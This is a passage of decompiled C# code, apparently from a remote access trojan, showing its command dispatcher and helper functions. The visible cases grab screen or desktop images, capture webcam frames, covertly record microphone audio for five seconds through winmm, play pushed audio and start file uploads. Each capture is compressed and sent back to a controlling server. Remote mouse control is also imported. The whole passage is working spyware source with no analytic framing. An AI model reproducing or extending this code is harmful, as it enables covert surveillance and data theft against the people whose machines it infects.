					Image val4 = (Image)NewLateBinding.LateGet(C.inv(ref Cdll, ref lpstrCommand, ref lpstrReturnString, ref P), (Type)null, "Clone", new object[0], (string[])null, (Type[])null, (bool[])null);
					MemoryStream memoryStream6 = new MemoryStream();
					val4.Save((Stream)memoryStream6, ImageFormat.get_Jpeg());
					MemoryStream memoryStream7 = new MemoryStream();
					memoryStream7.Write(MyProject.Forms.B.WC.STB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#23" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), (object)Y))), 0, MyProject.Forms.B.WC.STB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#23" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), (object)Y))).Length);
					memoryStream7.Write(memoryStream6.ToArray(), 0, memoryStream6.ToArray().Length);
					MyProject.Forms.B.WC.SendData(memoryStream7.ToArray());
					break;
				}
				case "#39":
				{
					num = -1;
					if (B.Busy)
					{
						break;
					}
					B.Busy = true;
					Array array3 = default(Array);
					try
					{
						string lpstrCommand = "Cam.Cam";
						string lpstrReturnString = "Dnames";
						object P = null;
						array3 = Strings.Split(Conversions.ToString(C.inv(ref Cdll, ref lpstrCommand, ref lpstrReturnString, ref P)), "^:^", -1, (CompareMethod)0);
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num2);
						ProjectData.ClearProjectError();
					}
					if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null), (object)"", false))
					{
						int num3 = array3.Length - 1;
						for (int j = 0; j <= num3; j++)
						{
							try
							{
								string text2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { j }, (string[])null));
								string lpstrCommand = "Cam.Cam";
								string lpstrReturnString = "Cam";
								object P = new object[2] { 5, text2 };
								Image val = (Image)C.inv(ref Cdll, ref lpstrCommand, ref lpstrReturnString, ref P);
								MemoryStream memoryStream3 = new MemoryStream();
								val.Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
								MemoryStream memoryStream4 = new MemoryStream();
								memoryStream4.Write(MyProject.Forms.B.WC.STB("#24" + Y), 0, MyProject.Forms.B.WC.STB("#24" + Y).Length);
								memoryStream4.Write(memoryStream3.ToArray(), 0, memoryStream3.ToArray().Length);
								MyProject.Forms.B.WC.SendData(memoryStream4.ToArray());
								B.Busy = false;
								return;
							}
							catch (Exception ex3)
							{
								ProjectData.SetProjectError(ex3, num2);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(1000);
						}
					}
					num2 = 39;
					break;
				}
				case "#40":
				{
					MemoryStream memoryStream2 = new MemoryStream();
					memoryStream2.Write(Da, NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString()!.Length + Y.Length, Da.Length - (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString()!.Length + Y.Length));
					Audio audio = ((Computer)MyProject.Computer).get_Audio();
					byte[] b3 = memoryStream2.ToArray();
					bool CM = false;
					audio.Play(API.ZIP(b3, ref CM), (AudioPlayMode)1);
					break;
				}
				case "#41":
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"#41", false))
					{
						string lpstrCommand = "open new Type waveaudio Alias recsound";
						string lpstrReturnString = "";
						mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
						lpstrCommand = "record recsound";
						lpstrReturnString = "";
						mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
						Thread.Sleep(5000);
						lpstrCommand = "save recsound " + TM + "rq";
						lpstrReturnString = "";
						mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
						lpstrCommand = "close recsound";
						lpstrReturnString = "";
						mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
						MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(MyProject.Forms.B.WC.STB("#25" + Y), 0, MyProject.Forms.B.WC.STB("#25" + Y).Length);
						byte[] b = File.ReadAllBytes(TM + "rq");
						bool CM = true;
						byte[] array2 = API.ZIP(b, ref CM);
						memoryStream.Write(array2, 0, array2.Length);
						MyProject.Forms.B.WC.SendData(memoryStream.ToArray());
					}
					break;
				case "#42":
				{
					UL uL = new UL();
					uL.sock = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					uL.F = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
					uL.start();
					break;
				}
				}
			}
			catch (Exception ex21)
			{
				ProjectData.SetProjectError(ex21, num2);
				Exception ex22 = ex21;
				B.Busy = false;
				string lpstrCommand;
				switch (num)
				{
				case -1:
					ProjectData.ClearProjectError();
					return;
				case -2:
				{
					B b30 = MyProject.Forms.B;
					lpstrCommand = "#23" + Y + Conversions.ToString(2);
					b30.SEND(ref lpstrCommand);
					ProjectData.ClearProjectError();
					return;
				}
				}
				B b31 = MyProject.Forms.B;
				string[] array12 = new string[6]
				{
					"#10",
					Y,
					"^",
					Conversions.ToString(num),
					Y,
					null
				};
				string[] array78 = array12;
				lpstrCommand = ex22.Message;
				array78[5] = API.ENB(ref lpstrCommand);
				string lpstrReturnString = string.Concat(array12);
				b31.SEND(ref lpstrReturnString);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	public static string siz(string Size)
	{
		if (Size.Length < 4)
		{
			return Size + " Bytes";
		}
		string text = Conversions.ToString(Conversions.ToDouble(Size) / 1024.0);
		string text2 = " KB";
		int num = default(int);
		if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
		{
			Array array = Strings.Split(text, ".", -1, (CompareMethod)0);
			text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null));
			num = ((NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 1, 3)));
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " MB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array2 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		if (text.Length > 3)
		{
			text = Conversions.ToString(Conversions.ToDouble(text) / 1024.0);
			text2 = " GB";
			if (Strings.InStr(text, ".", (CompareMethod)0) > 0)
			{
				Array array3 = Strings.Split(text, ".", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				num = ((NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		return text + "." + Conversions.ToString(num) + text2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static byte[] SB(ref string s, ref byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = Encoding.Default.GetBytes(s);
		memoryStream.Write(bytes, 0, bytes.Length);
		byte[] b = B;
		bool CM = true;
		byte[] array = API.ZIP(b, ref CM);
		memoryStream.Write(array, 0, array.Length);
		return memoryStream.ToArray();
	}
}
